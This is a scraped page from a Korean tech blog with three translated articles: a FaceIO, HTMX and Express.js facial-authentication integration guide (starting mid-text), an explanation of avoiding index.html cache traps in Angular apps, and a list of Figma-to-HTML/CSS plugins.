살펴보겠습니다.\n\n![faceio](/assets/img/2024-05-01-IntegratingFaceIOusingHTMXandExpressJS_0.png)\n\nFaceIO 개요\n\nFACEIO는 원활한 통합과 실시간 이벤트 알림을 위한 포괄적인 API 및 Webhooks 기능을 제공합니다. API를 통해 개발자들은 애플리케이션을 관리하고 등록 및 인증과 같은 작업을 수행하고 분석을 수집할 수 있습니다. 이는 HTTP를 통해 작동하여 모든 요청에 대해 표준 응답 코드를 제공하고 JSON을 반환합니다. API 키를 FACEIO 콘솔을 통해 관리하여 안전한 액세스가 보장됩니다. Webhooks는 등록 및 인증과 같은 이벤트에 대한 실시간 알림을 가능하게 합니다. 이벤트가 트리거될 때, FACEIO는 사용자 ID, 이벤트 유형, 타임스탬프 및 IP 정보와 같은 이벤트 세부 정보가 포함된 HTTP POST 요청을 구성된 URL로 보내어 적시에 백엔드 업데이트와 적극적인 대응을 용이하게 합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n![](https://miro.medium.com/v2/resize:fit:1400/1*Nc0gNijxAiCVb3-UfHcQSQ.gif)\n\nHTMX에 대한 간단한 설명\nHTMX는 HTML에서 브라우저 기능에 직접 액세스하여 JavaScript와 클라이언트-서버 통신 관리의 필요성을 줄이는 방식으로 웹 개발을 간소화합니다. 클라이언트 측 렌더링 기능을 통해 전체 페이지 새로고침을 최소화하여 웹 앱의 반응성을 향상시킵니다. HTMX는 hx-get 및 hx-post와 같은 직관적인 HTML 속성을 통해 폼 제출 및 실시간 업데이트와 같은 기능을 용이하게 지원합니다.\n\nHTMX와 FaceIO 통합\nFaceIO를 HTMX와 통합하는 것은 웹 애플리케이션에서 원활한 얼굴 인증을 가능하게 하는 여러 단계로 이뤄집니다. 아래는 이 통합 프로세스를 보여주는 주요 단계와 코드 샘플입니다:\n\n![](/assets/img/2024-05-01-IntegratingFaceIOusingHTMXandExpressJS_1.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nFaceIO 설정하기\nFaceIO 콘솔에서 FaceIO 애플리케이션의 공개 ID를 가져옵니다.\n웹 애플리케이션에서 FaceIO 얼굴 인식 엔진을 초기화합니다.\nFaceIO를 설정하는 샘플 코드:\n\n```js\n\u003chead\u003e\n  \u003cscript src=\"https://cdn.faceio.net/fio.js\"\u003e\u003c/script\u003e\n  \u003cscript\u003e\n    // 공개 ID로 FaceIO를 초기화합니다\n    const faceIO = new FaceIO('YOUR_PUBLIC_ID');\n  \u003c/script\u003e\n\u003c/head\u003e\n```\n\nHTMX 통합하기\nHTMX 라이브러리를 HTML에 스크립트 태그를 포함하여 프로젝트에 추가합니다.\nHTMX 속성을 활용하여 동적 상호작용을 정의하고, 예를 들어 버튼 클릭 시 FaceIO 인증을 트리거할 수 있습니다.\nHTMX를 통합하는 샘플 코드:\n\n```js\n\u003chead\u003e\n  \u003cscript src=\"https://cdn.jsdelivr.net/npm/htmx.org@1.6.1/dist/htmx.min.js\"\u003e\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n  \u003c!-- 버튼 클릭으로 FaceIO 인증 트리거하기 --\u003e\n  \u003cbutton hx-get=\"/authenticate\" hx-trigger=\"click\"\u003eFaceIO로 인증하기\u003c/button\u003e\n\u003c/body\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nNode.js와 Express를 사용하여 서버 측 엔드포인트 만들기\nFaceIO 인증 요청을 처리하기 위한 서버 측 엔드포인트를 정의하십시오.\nFaceIO API와 상호 작용하여 얼굴 인식을 기반으로 사용자를 인증하는 서버 측 로직 구현하기\n\n```js\nconst express = require('express');\nconst app = express();\n\n// FaceIO 인증을 처리하는 엔드포인트\napp.get('/authenticate', async (req, res) =\u003e {\n  try {\n    // 얼굴 인증을 수행하기 위해 FaceIO API 호출\n    const authenticationResult = await faceIO.authenticate();\n\n    // 인증 결과 처리 (예: 액세스 부여 또는 오류 메시지 표시)\n    res.send(authenticationResult);\n  } catch (error) {\n    // 오류 처리 (예: 오류 메시지 기록 또는 오류 응답 반환)\n    res.status(500).send('내부 서버 오류');\n  }\n});\n\n// 서버 시작\nconst PORT = process.env.PORT || 3000;\napp.listen(PORT, () =\u003e {\n  console.log(`포트 ${PORT}에서 서버 실행 중`);\n});\n```\n\n원활한 인증 경험 설계하기\n사용자 인터페이스를 맞춤 설정하여 FaceIO 인증 프로세스 중에 피드백을 제공하기\n서버로부터의 인증 응답을 처리하여 UI를 그에 맞게 업데이트하기\n인증 결과에 따라 UI를 업데이트하는 샘플 코드:\n\n```js\n\u003cscript\u003e\n  async function authenticateWithFaceIO() {\n    try {\n      // HTMX를 통해 FaceIO 인증 수행\n      const response = await hx.get('/authenticate');\n\n      // 인증 결과에 따라 UI 업데이트\n      if (response.success) {\n        alert('인증 성공!');\n      } else {\n        alert('인증 실패. 다시 시도해주세요.');\n      }\n    } catch (error) {\n      console.error('오류:', error);\n    }\n  }\n\u003c/script\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n결론\n\n요약하자면, FaceIO를 HTMX와 Express.js와 통합하는 것은 웹 애플리케이션에서 보안을 강화하고 사용자 경험을 향상시키는 강력한 해결책을 제공합니다. FaceIO를 통해 얼굴 인증을 활용하고, HTMX가 제공하는 동적 HTML 상호작용과 Express.js의 강력한 백엔드 기능을 결합하여 개발자는 견고하고 사용자 친화적인 인증 시스템을 구축할 수 있습니다. 이 통합은 비밀번호 관련 위반 사례를 완화함으로써 보안 조치를 강화할 뿐만 아니라, 인증 프로세스를 간소화하여 원활하고 효율적인 사용자 경험을 조성합니다. FaceIO, HTMX 및 Express.js 간의 협업을 더 심층적으로 탐구함으로써, 웹 개발에서 혁신적인 발전을 이루며 안전하고 동적인 애플리케이션이 접근 가능하면서도 최고의 개인 정보 보호와 사용 용이성 기준을 유지할 수 있도록 합니다.","ogImage":{"url":"/assets/img/2024-05-01-IntegratingFaceIOusingHTMXandExpressJS_0.png"},"coverImage":"/assets/img/2024-05-01-IntegratingFaceIOusingHTMXandExpressJS_0.png","tag":["Tech"],"readingTime":4},{"title":"앵귤러로 웹사이트 만들 때 캐시 함정을 피하는 방법","description":"","date":"2024-05-01 23:52","slug":"2024-05-01-AvoidcachetrapwhenservingAngularapp","content":"\n\n![이미지](/assets/img/2024-05-01-AvoidcachetrapwhenservingAngularapp_0.png)\n\n가장 이상한 버그 중 하나는 대규모 디자인 변경 후 발생했어요. 매일 아침마다 문제가 생기는 건데, 왜 그런 걸까요? 이 기사 제목을 보셨으니 이미 캐시와 관련이 있다는 건 알겠죠. 그렇다면 이런 문제가 왜 발생하는 걸까요, 그리고 어떻게 예방할 수 있을까요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n우리는 모두 캐시를 좋아합니다, 맞지요? 캐시는 앱을 더 빨리 로드하는 데 도움을 주고, 서버로부터 일부 부하를 줄여 주며, 사용자들이 우리 앱에서 좋은 사용자 경험을 느낄 수 있도록 합니다.\n\n하지만 때로는 이 캐시가 우리에게 반대로 작용하고 사용자들이 앱의 최신 버전을 얻지 못하도록 할 수 있습니다. 이는 아마도 서버의 잘못된 캐시 구성 때문인 경우가 많습니다.\n\n우리 Angular 애플리케이션에서 캐시 문제를 피하고 앱 버전 관리하기 위해서, 우리가 ng build --prod로 프로덕션용 앱을 빌드할 때 Angular는 (기본적으로) 우리의 js 파일에 해시를 추가하고 index.html 파일을 해시 파일을 참조하도록 업데이트합니다. 새 버전을 배포하면 해시 키가 변경되고 사용자가 사이트를 다시 요청하면 index.html은 서버에서 새 파일을 로드하도록 요청합니다. 브라우저에는 이러한 파일이 캐시되어 있지 않기 때문에 서버에서 파일을 받아옵니다.\n\n그래서 Angular 덕분에 문제가 해결됐다고 할 수 있을까요? 음, 완전히 그렇지는 않습니다. 문제는 index.html 파일이 캐시될 때 발생합니다. 새로운 앱 버전을 디플로이했고 정적 파일과 index.html 파일이 캐시되어 있는 상황에서 사용자가 메인 URL에서 앱을 시작하면 캐시된 index.html은 이전 js 파일을 로드하도록 요청할 것이고, 이 파일들은 브라우저 캐시로부터 로드될 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n하지만 시나리오를 계속 진행하면서 약간 복잡해집니다. 사용자는 우리 앱을 사용하며(기억하세요 - 이전 버전으로), 화면 간 이동을 하고 몇 가지 작업을 합니다. 어느 시점에서 새로고침을 하기로 결정했는데, 이제 새 앱 버전을 받게 되었습니다.\n\n기다려주세요, 새 버전? 하지만 왜요? index.html이 캐시에 있고, 왜 새 버전을 받고 있을까요? 이는 SPA를 서버에서 제공할 때 리다이렉트하는 방식과 관련이 있습니다.\n\nSPA는 클라이언트 측에서 앱 내비게이션을 처리하며, Angular 라우터를 통해 새 경로로 이동할 때마다 주소 표시줄의 URL을 동적으로 변경합니다. 사용자가 브라우저 주소 표시줄에 앱의 루트를 입력하고, 예를 들어 https://some-domain.com/home을 입력하고 엔터를 클릭하면, 실제로 서버에 이 루트가 없지만, 404를 반환하는 대신 서버에서 index.html을 반환하도록 구성되어 있습니다. Angular 라우터가 작업을 수행하고 사용자를 올바른 화면으로 이동시킵니다.\n\n이제 우리 시나리오에서 무슨 일이 일어나고 있는지 이해할 수 있습니다. 메인 URL에서 앱에 접속하면 캐시에 이 엔드포인트가 있기 때문에 이전 버전을 받게 됩니다. 그러나 특정 경로를 요청하는 경우, 항상 서버에서 index.html을 받고 캐시에서가 아닌 새 버전을 보게 됩니다 - 따라서 새로 고침 후에 새 버전이 나타날 것입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n좋죠, 그렇죠? 덕분에 캐시에 있는 하나의 index.html 때문입니다.\n\n## index.html 파일이 캐시되었는지 확인하는 방법\n\nindex.html 파일이 캐시되어 있는지 확인하는 것은 매우 쉽습니다.\n\n- 브라우저 개발 도구를 엽니다.\n- 네트워크 탭으로 이동합니다.\n- 캐시 사용 확인란이 선택되지 않았는지 확인합니다.\n- 문서로 필터링합니다.\n- 화면을 새로 고칩니다.\n- 첫 번째 문서를 클릭합니다.\n- 캐시 제어 헤더를 확인합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n예를 들어 angular.io/docs 사이트를 살펴봅시다:\n\n![이미지](/assets/img/2024-05-01-AvoidcachetrapwhenservingAngularapp_1.png)\n\n캐시 제어 헤더를 보면 no-cache로 설정되어 있습니다. 캐시 제어 헤더에서 어떤 값이 우리에게 좋은지 알아봅시다.\n\n- no-cache — 이 값을 사용하면 index.html 파일이 캐시되지만, 캐시 시스템이 서버에 더 새로운 버전이 있는지 확인하도록 합니다. 우리에게 적합합니다.\n- no-store — 이 값을 사용하면 캐시 시스템이 index.html 파일을 캐시하지 않도록 합니다. 좋은 방법입니다.\n- max-age=0 — 이 값 또한 index.html을 캐시하지 않습니다.\n- max-age=31536000 — 이 값은 좋지 않습니다. max-age의 값은 초로 표현되며, index.html이 1년 동안 캐시됩니다. 어떤 값이 적합한지는 본인의 의견에 따라 다를 수 있지만, index.html을 1년 동안 캐시하고 싶지 않을 것이라는 점에 동의할 수 있을 것 같습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n그것들은 cache-control 헤더에 대한 인기있는 값들이에요; 응답에서 다른 것을 본다면, 여기서 확인해보실 수 있어요.\n\n## cache-control 헤더를 제공하지 않았을 경우에는 어떻게 될까요?\n\n음, 지금은 \"무인도\" 영역에 있다고 할 수 있어요.\n\n![이미지](/assets/img/2024-05-01-AvoidcachetrapwhenservingAngularapp_2.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n이 문구는 w3.org 섹션 13.2.2에서 인용한 것입니다:\n\n여기서 몇 가지 종류의 캐시를 언급하는 것이 좋을 것 같습니다. 우리 브라우저의 캐시는 우리 브라우저에서만 우리에게 서비스하는 개인 캐시입니다. 그러나 여러 가지 가능성으로 사용자 간에 공유되는 공개 캐시도 있습니다: 프록시 캐시, 게이트웨이 캐시, CDN, 역방향 프록시 캐시 및 로드 밸런서 등이 있습니다.\n\n따라서, 우리는 indx.html을 캐시하는 방법에 대한 구체적인 지시를 제공하지 않았을 때 어떻게 캐시를 처리해야 하는지에 대한 명세가 없음을 이해했습니다. 기본적으로 모든 캐시나 브라우저는 우리가 제공하거나 제공하지 않는 다른 헤더에 기반한 자체 알고리즘을 적용하고 여전히 index.html을 캐시 할 수 있습니다. 게다가, 이러한 종류의 것들은 테스트할 수 없습니다. 사용자들이 사설 네트워크나 캐시 알고리즘을 적용하는 ISP에서 앱에 접속할 수 있으며 당신은 그 사실조차 알지 못할 수 있습니다. 이것이 W3가 적용을 권장하는 이유입니다. 우리가 명시적인 만료 시간을 제공하도록 하는 것입니다.\n\n따라서, index.html에 올바른 캐시 제어 헤더가 함께 제공되는지 확인하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 캐시 함정\n\ncached index.html의 실제 문제는 캐시에 이미 파일을 받은 사용자들이 캐시된 파일로 갇혀 있을 수 있는 점입니다. 이 상황이 해결되는 방법은 두 가지 중 하나가 발생할 때까지 기다려야 합니다:\n\n- 사용자가 캐시를 수동으로 지우는 경우(브라우저 캐시에 파일이 캐시된 경우를 가정함).\n- 캐시 만료일이 도래하는 경우.\n\n걱정하지 마세요; 이러한 index.html 문제는 상당히 드뭅니다. 대부분의 호스팅 서비스들은 기본적으로 오랜 캐시 구성이 있는 정적 파일을 제공하지 않습니다. 그러나 Angular 앱을 제공하는 서버가 이미 존재하고 동적 파일을 제공하는 경우에는 이 문제가 발생할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## index.html 폼이 캐싱되는 것을 방지하는 방법\n\n아마도 HTML 메타 태그로 캐시를 제어하려고 시도하라는 StackOverflow 답변을 몇 가지 찾을 수 있을 겁니다. 심지어 이를 테스트해 볼 수 있고, 브라우저에서 작동할 수도 있습니다. 하지만 좀 더 조사해 보면, 이는 캐시를 방지하는 효과적인 방법이 아님을 알게 될 것입니다. 이러한 태그들은 일부 브라우저에 의해 존중될 수 있지만 다른 유형의 캐시에는 존중되지 않을 수 있습니다.\n\n가장 좋은 방법은 서버의 index.html에 캐시 제어 헤더를 설정하는 것입니다. 이를 위해 서버 구성에 일부 변경이 필요하지만 이것이 캐시를 방지하는 가장 간단하고 효과적인 방법입니다.\n\n## 서비스 워커를 사용하고 있어요; 모두 좋아요!\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n죄송하지만 아니에요.\n\nangular.io의 예제에서 서비스 워커에서 서비스되는 파일을 주목했을 수 있습니다. 그러나 Angular 팀은 여전히 이 파일을 캐시 제어=no-cache 헤더와 함께 서버에서 보냅니다.\n\n서비스 워커는 멋져요! 풀 컨트롤을 제공하는 동시에 파일을 캐싱합니다. 그러나 이전에 언급한 대로 몇 가지 캐시 유형이 있죠. 서비스 워커는 그 중 하나일 뿐입니다. 요청이 통과하는 레이어 중 하나인 서비스 워커는 HTTP 캐시(브라우저 캐시)나 공용 캐시는 대신하지 않습니다. 서비스 워커가 서버에서 파일을 가져오기로 결정하면 브라우저는 여전히 해당 헤더를 확인하여 캐시에서 제공할지 여부를 결정할 것입니다.\n\n## 결론\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n몇 가지 캐시 문제는 디버그하기 어렵고 재현하기 어렵며 쉽게 코드 문제로 오해될 수 있습니다. 보통 우리 앱의 최종 사용자로부터 발생하며 새 버전을 얼마나 자주 릴리스하는지에 따라 달라집니다. 일부 사용자는 문제가 있다고 신고하지 않을 수도 있고, 그냥 \"새로고침하면 사라지는 이상한 동작\"으로만 설명할 수도 있습니다.\n\n우리 모두는 사용자들을 위해 최상의 경험을 원합니다 — 자신이 확신이 없다면, 오늘은 캐시를 확인해보세요! 😏","ogImage":{"url":"/assets/img/2024-05-01-AvoidcachetrapwhenservingAngularapp_0.png"},"coverImage":"/assets/img/2024-05-01-AvoidcachetrapwhenservingAngularapp_0.png","tag":["Tech"],"readingTime":5},{"title":"Figma 디자인을 HTML과 CSS로 변환하는 플러그인 10가지","description":"","date":"2024-05-01 23:51","slug":"2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode","content":"\n\n![이미지](https://miro.medium.com/v2/resize:fit:960/0*63WG6R0wvA90tl3C.gif)\n\n요즘 디지털 세상에서 온라인 애플리케이션은 인터넷 생활을 이끌기 위한 필수 구성 요소 중 하나입니다. 그러한 애플리케이션을 만드는 것은 더 많은 노력이 필요합니다. 디자인부터 개발까지, 작업이 복잡했던 반면, 디자이너와 개발자 간의 협업은 특히 디자인 제품을 만들 때 항상 도전이었습니다.\n\nFigma 및 그 플러그인들은 전체 제품을 처음부터 수동 코드로 작성하는 과정과 같은 모든 소음을 제거하는 단일 소스로 나타났습니다. 따라서, 여기에서는 Figma 디자인을 HTML 및 CSS 코드 스니펫으로 변환하여 디자인부터 코드로의 여정을 이전보다 훨씬 원활하게 만들어주는 최고의 15가지 Figma 플러그인을 소개합니다.\n\n# 디자인을 HTML 및 CSS 코드로 변환하는 최고의 10개 Figma 플러그인\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 제플린\n\n![제플린](https://miro.medium.com/v2/resize:fit:1400/0*7-PK7dTGINR7K4O6.gif)\n\n제플린은 디자이너와 개발자 양쪽 모두에게 최고의 도구 중 하나입니다. 이 도구는 협업 작업을 간단화할 뿐만 아니라 Figma 디자인 및 요소를 픽셀 완벽한 CSS 및 HTML 스니펫으로 변환합니다. 가장 좋은 점은 생성된 코드를 수동 편집 없이 개발 프로세스에 직접 구현할 수 있다는 것입니다. 제플린을 사용하면 개발 프로세스를 더 효과적이고 생산적으로 더욱 촉진할 수 있습니다.\n\n2. Anima\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n![Anima](https://miro.medium.com/v2/resize:fit:1400/0*jCye8_4bx0e-doVR.gif)\n\n애니마(Anima)는 다른 유명한 도구로, 반응형 디자인을 통해 사용자 경험을 향상시키는 데 알려져 있습니다. 이 도구는 모든 요소를 서로 다른 화면 크기에 맞춰 유지함으로써 애플리케이션이 매력적이고 매력적으로 보이도록합니다. 사용자가 애플리케이션에 액세스할 때 화면 크기가 어떻게 되든 웹사이트가 일정하게 유지됩니다. 또한 Anima는 Figma 내에서 상호작용 및 애니메이션을 직접 결정하도록 하면서 모든 디자인에 대한 자동 HTML 및 CSS 코드를 생성합니다.\n\n3. Framer Web\n\n![Framer Web](/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_0.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n프레이머 웹은 하나의 플러그인 내에서 세 가지 필수 코딩 측면을 제공하는 세 가지인-원 솔루션 툴입니다. 디자이너가 모델을 설계하고 프로토타입을 만들 수 있도록 도와주며, 개발자는 손쉽게 실행 가능한 HTML 및 CSS 코드로 변환할 수 있습니다. 이 모든 작업을 Figma와 프레이머 웹을 떠나지 않고 하나의 인터페이스에서 수행할 수 있습니다. 만약 올인원 디자인, 프로토타입 및 코딩 도구가 필요하다면 이 플러그인을 선택해야 합니다.\n\n4. HTML to Figma\n\n![HTML to Figma](/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_1.png)\n\nHTML to Figma은 외부 HTML 및 CSS 코드를 Figma로 가져올 수 있는 기능으로 구성되어 다른 디자인-코드 변환 방식과는 다릅니다. 디자이너와 개발자가 기존 코드베이스를 개선하기 위해 협업할 수 있습니다. 이를 통해 디자이너와 협력하여 개발 주기를 가속화시키고 코드의 수동 업데이트 필요성을 제거할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n5. Figma를 HTML로\n\n![Figma to HTML](/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_2.png)\n\nFigma를 HTML로 변환하여 개발 과정을 가속화할 수 있습니다. 이 플러그인은 Figma 디자인을 HTML 및 CSS 코드 조각으로 변환하여 코드가 반응형임을 보장합니다. 세부 사항에 주의를 기울이는 이 플러그인을 사용하면 프로젝트를 더 정확하고 효율적으로 만들 수 있습니다. 게다가 코드가 이미 반응형이므로 사용자 경험을 향상시킬 수 있습니다.\n\n6. Koncept\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n![image](https://miro.medium.com/v2/resize:fit:1400/0*vdRtH-uxMhPYHYXX.gif)\n\nKoncept은 디자인을 코드로 변환하는 프로세스를 넘어서는 포괄적인 디자인 및 프로토타이핑 플랫폼입니다. 깔끔하고 조직적인 HTML 및 CSS 코드 조각을 생성하여 개발 프로세스에서 직접 구현할 수 있는 기본 기능 외에도 플랫폼 내에서 애니메이션 및 상호작용을 정의할 수 있습니다.\n\n7. Auto-Layout to HTML\n\n![image](/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_3.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nAuto-Layout to HTML 플러그인은 반응형 디자인에 중점을 둡니다. Figma의 자동 레이아웃 기능을 활용하여 요소를 유연한 CSS Grid 또는 Flexbox 레이아웃으로 변환합니다. Auto-Layout to HTML은 자동 레이아웃 기능에 의존하기 때문에 버튼은 텍스트에 따라 크기가 조절되고, 목록은 항목과 함께 재배열되며, 복잡한 인터페이스를 생성할 수 있습니다. 컨텐츠에 반응하는 웹사이트를 만들 수 있습니다. PixelPerfect은 Figma 디자인과 생성된 HTML 및 CSS 코드 간의 정확도를 높입니다. 번역된 코드는 완벽할 정도로 정확하여 실행된 코드가 Figma 디자인과 똑같은 결과를 제공합니다. 이 플러그인은 변환 프로세스 중에 디자인 일관성을 유지하는 데 안성맞춤입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n9. CSS Scan\n\n![CSS Scan](/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_4.png)\n\nCSS Scan은 작은 수정 사항이 있는 동일한 디자인 세트에서 작업할 때 도와주는 시간을 절약하는 도구입니다. 코드에서 정확한 색상, 글꼴 크기 및 기타 스타일을 복제할 때 어떤 요소에서도 CSS 값들을 직접 추출할 수 있습니다. 몇 번의 클릭으로 모든 작업을 완료할 수 있어서 지루한 색상 코드를 기억할 필요도 없습니다.\n\n10. Figmify\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n![figmify](/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_5.png)\n\n디자인에 복잡한 상호 작용이나 애니메이션이 필요하지 않은 경우 Figmify가 최적의 선택일 수 있습니다. 몇 번의 클릭으로 Figmify가 Figma 디자인을 깔끔한 HTML 및 CSS 코드 조각으로 변환하도록 자동화할 수 있습니다.\n\n# 요약:\n\n애플리케이션을 구축하는 것은 어렵습니다. 특히 디자이너와 개발자 간의 적절한 협력이 없을 때입니다. 이 모든 것을 연결하는 과정에서 Figma는 개발 프로세스를 용이하게 해주는 플러그인을 소개했습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n각 플러그인은 반응형 디자인부터 고급 상호 작용 프로토타이핑까지 다양한 기능을 제공하여 특정 요구 사항을 충족시킵니다. 이러한 플러그인을 사용하면 Figma 요소를 실행 가능한 HTML 및 CSS 코드로 변환하는 번거로운 작업을 완전히 제거할 수 있습니다. 넓은 Figma 커뮤니티를 탐험하고, 도전적인 디자인-코드 작업 프로세스를 향상시켜보세요!\n\nFigma의 기능과 업데이트를 보려면 Linkedin에서 팔로우하기를 잊지마세요.","ogImage":{"url":"/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_0.png"},"coverImage":"/assets/img/2024-05-01-10FigmaPluginstoConvertDesignsintoHTMLandCSSCode_0.png","tag":["Tech"],"readingTime":5}],"page":"65","totalPageCount":71,"totalPageGroupCount":4,"lastPageGroup":11,"currentPageGroup":3},"__N_SSG":true},"page":"/posts/[page]","query":{"page":"65"},"buildId":"K-h7XvEVBqnNx_uXMgZoe","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>